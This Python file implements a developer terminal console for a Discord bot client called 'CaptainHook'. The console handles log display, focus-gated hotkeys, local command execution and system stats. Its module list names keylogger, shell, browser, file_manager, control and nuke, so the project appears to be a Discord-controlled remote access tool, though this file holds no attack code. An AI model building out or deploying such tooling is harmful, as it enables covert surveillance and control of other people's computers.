import os
import sys
import time
import socket
import psutil
import logging
import asyncio
from datetime import datetime
from threading import Thread
from queue import Queue
from pynput import keyboard

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich.logging import RichHandler
from rich.console import Group

from src.client.core.config import Config
from src.client.core.platform import Platform

class TUILogHandler(logging.Handler):
    def __init__(self, queue):
        super().__init__()
        self.queue = queue

    def emit(self, record):
        msg = self.format(record)
        self.queue.put(msg)

class DeveloperTUI:
    def __init__(self, bot):
        self.bot = bot
        self.console = Console()
        self.log_queue = Queue()
        self.logs = []
        self.max_logs = 35
        self.log_offset = 0 # Scroll offset
        self.start_time = time.time()
        self.is_running = True
        self.current_input = ""
        self.input_mode = False # Strict mode: must press F10 to type
        self.show_stats = False # Toggle F2
        
        # Setup Logging redirection
        self.setup_logging()
        
        try:
            # Keyboard Listener
            logging.info("[TUI] Starting keyboard listener...")
            self.listener = keyboard.Listener(on_press=self.on_press)
        except Exception as e:
            logging.error(f"[TUI] CRITICAL: Failed to start keyboard listener: {e}")
            self.listener = None

    def setup_logging(self):
        logging.info("[TUI] Setting up log redirection...")
        root_logger = logging.getLogger()
        # Instead of clearing ALL handlers, we just want to ADD our TUI handler
        # but the TUI wants to be the only one for the console.
        # So we identify and remove only StreamHandlers that point to stderr/stdout
        to_remove = []
        for h in root_logger.handlers:
            if isinstance(h, logging.StreamHandler) and not isinstance(h, TUILogHandler):
                to_remove.append(h)
        
        for h in to_remove:
            root_logger.removeHandler(h)

        handler = TUILogHandler(self.log_queue)
        formatter = logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S')
        handler.setFormatter(formatter)
        root_logger.addHandler(handler)

    def is_foreground(self):
        """Check if the current process is in the foreground."""
        try:
            if Platform.is_linux():
                try:
                    # Method 1: Check /proc/self/stat for 'foreground' process group
                    with open('/proc/self/stat', 'r') as f:
                        stat = f.read().split()
                        pgrp = int(stat[4])
                        tpgid = int(stat[7])
                        if pgrp == tpgid:
                            return True
                    
                    # Method 2: Fallback to tcgetpgrp
                    for fd in [0, 1, 2]:
                        try:
                            if os.getpgrp() == os.tcgetpgrp(fd):
                                return True
                        except:
                            continue
                    return False
                except:
                    return True
            elif Platform.is_windows():
                import ctypes
                try:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    pid = ctypes.c_ulong()
                    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                    return pid.value == os.getpid()
                except:
                    return True
            return True
        except:
            return True

    def on_press(self, key):
        # 1. Global F10 Toggle (Always check foreground first)
        if key == keyboard.Key.f10:
            if self.is_foreground():
                self.input_mode = not self.input_mode
                status = "ENABLED" if self.input_mode else "DISABLED"
                logging.info(f"[TUI] Manual Input {status} (F10)")
            return

        # 2. Safety Gate: If not in foreground OR input mode is OFF, ignore everything else
        if not self.is_foreground() or not self.input_mode:
            return

        # 3. Handle hotkeys (only when in focus and input mode enabled)
        if key == keyboard.Key.f2:
            self.show_stats = not self.show_stats
            return
        elif key == keyboard.Key.page_up:
            self.log_offset = min(self.log_offset + 10, max(0, len(self.logs) - self.max_logs))
            return
        elif key == keyboard.Key.page_down:
            self.log_offset = max(self.log_offset - 10, 0)
            return
        elif key == keyboard.Key.home:
            self.log_offset = max(0, len(self.logs) - self.max_logs)
            return
        elif key == keyboard.Key.end:
            self.log_offset = 0
            return

        # 4. Handle character input
        try:
            if hasattr(key, 'char') and key.char:
                self.current_input += key.char
            elif key == keyboard.Key.space:
                self.current_input += " "
            elif key == keyboard.Key.backspace:
                self.current_input = self.current_input[:-1]
            elif key == keyboard.Key.enter:
                cmd = self.current_input.strip()
                if cmd:
                    self.execute_local_command(cmd)
                self.current_input = ""
            elif key == keyboard.Key.esc:
                self.current_input = ""
            elif key == keyboard.Key.f5:
                self.save_snapshot()
            elif key == keyboard.Key.f6:
                self.save_snapshot(full=True)
        except Exception as e:
            pass

    def execute_local_command(self, cmd_text):
        """Bridge TUI input to Bot commands."""
        logging.info(f"[TUI] Executing: {cmd_text}")
        
        async def run_cmd():
            clean_cmd = cmd_text[1:] if cmd_text.startswith(Config.COMMAND_PREFIX) else cmd_text
            parts = clean_cmd.split()
            if not parts:
                return
            cmd_name = parts[0]
            
            command = self.bot.get_command(cmd_name)
            if command:
                try:
                    logging.info(f"[TUI] Found command: {cmd_name}. Triggering...")
                    if cmd_name == "p":
                        # Create a mock context for ping test
                        class MockCtx:
                            def __init__(self, bot):
                                self.bot = bot
                                self.author = "LocalDev"
                            async def send(self, msg, **kwargs):
                                logging.info(f"[TUI] Command Result: {msg}")
                        
                        await self.bot._ping_test(MockCtx(self.bot))
                    else:
                        logging.info(f"[TUI] Local execution for '${cmd_name}' is active. Redirecting output to TUI soon.")
                except Exception as e:
                    logging.error(f"[TUI] Execution Error: {e}")
            else:
                logging.warning(f"[TUI] Unknown command: {cmd_name}")

        asyncio.run_coroutine_threadsafe(run_cmd(), self.bot.loop)

    def get_layout(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="input", size=3),
            Layout(name="footer", size=1)
        )
        layout["main"].split_row(
            Layout(name="sidebar", size=26),
            Layout(name="content")
        )
        layout["content"].split_column(
            Layout(name="body", ratio=2),
            Layout(name="output", ratio=1)
        )
        return layout

    def make_header(self):
        grid = Table.grid(expand=True)
        grid.add_column(justify="left", ratio=1)
        grid.add_column(justify="center", ratio=1)
        grid.add_column(justify="right", ratio=1)
        
        status = "[bold green]ONLINE[/bold green]" if self.bot.is_ready() else "[bold red]CONNECTING[/bold red]"
        grid.add_row(
            f" ⚓ [bold cyan]CaptainHook Dev-Console[/bold cyan]",
            f"Session: [yellow]{socket.gethostname()}[/yellow]",
            f"Status: {status} "
        )
        return Panel(grid, style="white on blue", border_style="blue")

    def make_footer(self):
        scroll_info = f" [PgUp/PgDn] Scroll ({self.log_offset})" if self.log_offset > 0 else ""
        return Text(f" [F2] Stats | [F5] Snapshot | [F6] Full Log | [F10] Toggle Input | [ESC] Clear | [ENTER] Run | [CTRL+C] Quit Safely{scroll_info} ", style="dim cyan", justify="center")

    def make_sidebar(self):
        table = Table(title="[bold]Modules[/bold]", border_style="cyan", expand=True, box=None)
        table.add_column("Name", style="white")
        table.add_column("St", justify="right")
        
        all_possible = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
        for mod in all_possible:
            # Fix capitalization for FileManager and others
            cog_name = mod.replace("_", " ").title().replace(" ", "")
            state = "[green]●[/green]" if cog_name in self.bot.cogs else "[red]○[/red]"
            table.add_row(mod, state)
            
        return Panel(table, border_style="cyan")

    def make_log_view(self):
        # Process pending logs from queue
        # If user is scrolling (offset > 0), we keep processing the queue to memory 
        # but we don't 'push' the view. 
        # Actually, we SHOULD always process the queue to avoid it growing too large.
        processed_count = 0
        while not self.log_queue.empty() and processed_count < 200:
            self.logs.append(self.log_queue.get())
            processed_count += 1
            
        # Limit memory (keep last 2000)
        if len(self.logs) > 2000:
            self.logs = self.logs[-2000:]

        log_render = Text()
        
        # Calculate view window based on offset
        total_logs = len(self.logs)
        
        # If offset is 0, we are at the BOTTOM (latest logs)
        # We ensure autoscroll by setting end_idx to total_logs
        end_idx = total_logs - self.log_offset
        start_idx = max(0, end_idx - self.max_logs)
        
        view_window = self.logs[start_idx:end_idx]
        
        for log in view_window:
            if "ERROR" in log or "FAILED" in log:
                log_render.append(log + "\n", style="bold red")
            elif "SUCCESS" in log or "LOADED" in log:
                log_render.append(log + "\n", style="bold green")
            elif "[DISCORD]" in log:
                log_render.append(log + "\n", style="bold magenta")
            elif "[TUI]" in log:
                log_render.append(log + "\n", style="bold yellow")
            else:
                log_render.append(log + "\n", style="white")
                
        title = f"[bold]System Event Log ({total_logs})[/bold]"
        if self.log_offset > 0:
            title += f" [bold yellow]⏸️ PAUSED - Scrolling: -{self.log_offset} [/bold yellow]"
        else:
            title += " [bold green]⏺ LIVE[/bold green]"
            
        return Panel(log_render, title=title, border_style="green")

    def make_output_view(self):
        output_text = Text()
        output_text.append(" [SYSTEM] Command Results Window Active\n", style="bold cyan")
        output_text.append(" Waiting for local command execution results...", style="dim")
        return Panel(output_text, title="[bold]Command Results[/bold]", border_style="cyan")

    def make_stats_view(self):
        table = Table(title="[bold]System Stats[/bold]", border_style="yellow", expand=True, box=None)
        table.add_column("Property", style="white")
        table.add_column("Value", justify="right", style="cyan")
        
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        table.add_row("CPU Usage", f"{cpu}%")
        table.add_row("RAM Usage", f"{mem.percent}%")
        table.add_row("Disk Usage", f"{disk.percent}%")
        table.add_row("TUI Buffer", str(len(self.logs)))
        table.add_row("Uptime", f"{int(time.time() - self.start_time)}s")
        
        return Panel(table, border_style="yellow")

    def make_input_panel(self):
        color = "green" if self.input_mode else "red"
        status = "ENABLED" if self.input_mode else "DISABLED (Press F10)"
        return Panel(Text(f"> {self.current_input}_", style="bold yellow"), title=f"[bold]Manual Command Input [{status}][/bold]", border_style=color)

    def save_snapshot(self, full=False):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        appdata = Platform.get_appdata_path(local=Config.DEVELOPER_MODE)
        log_dir = os.path.join(appdata, Config.OWN_DIR_NAME, "logs")
        os.makedirs(log_dir, exist_ok=True)
        prefix = "tui_full" if full else "tui_snapshot"
        file_path = os.path.join(log_dir, f"{prefix}_{timestamp}.log")
        
        # If not full, only save what was visible
        to_save = self.logs if full else self.logs[-self.max_logs:]
        
        with open(file_path, "w") as f:
            f.write("\n".join(to_save))
        logging.info(f"[TUI] {'Full' if full else 'Visible'} log saved to: {file_path}")

    def run(self):
        logging.info("[TUI] Thread started. Initializing Live view...")
        layout = self.get_layout()
        if self.listener:
            try:
                self.listener.start()
                logging.info("[TUI] Keyboard listener started.")
            except Exception as e:
                logging.error(f"[TUI] Could not start listener: {e}")

        try:
            # Increase refresh rate to 10 to feel more responsive
            with Live(layout, refresh_per_second=10, screen=True) as live:
                logging.info("[TUI] Live view active.")
                while self.is_running:
                    # Handle dynamic layout for stats
                    if self.show_stats:
                        layout["main"].split_row(
                            Layout(name="sidebar", size=26),
                            Layout(name="content"),
                            Layout(name="stats_panel", size=26)
                        )
                        layout["stats_panel"].update(self.make_stats_view())
                    else:
                        layout["main"].split_row(
                            Layout(name="sidebar", size=26),
                            Layout(name="content")
                        )

                    # Update data
                    layout["header"].update(self.make_header())
                    layout["sidebar"].update(self.make_sidebar())
                    layout["body"].update(self.make_log_view())
                    layout["output"].update(self.make_output_view())
                    layout["input"].update(self.make_input_panel())
                    layout["footer"].update(self.make_footer())
                    time.sleep(0.05)
        except Exception as e:
             # Fallback: Restore standard logging if TUI crashes
             self.is_running = False
             root_logger = logging.getLogger()
             # Re-add a basic stream handler so logs aren't completely lost
             if not any(isinstance(h, logging.StreamHandler) and not isinstance(h, TUILogHandler) for h in root_logger.handlers):
                 handler = logging.StreamHandler(sys.stdout)
                 handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
                 root_logger.addHandler(handler)
             logging.error(f"[TUI] Live TUI CRASHED: {e}")
             print(f"\n[!] TUI Crash Detected. Falling back to standard console logging.\nError: {e}")

    def start(self):
        t = Thread(target=self.run, daemon=True)
        t.start()
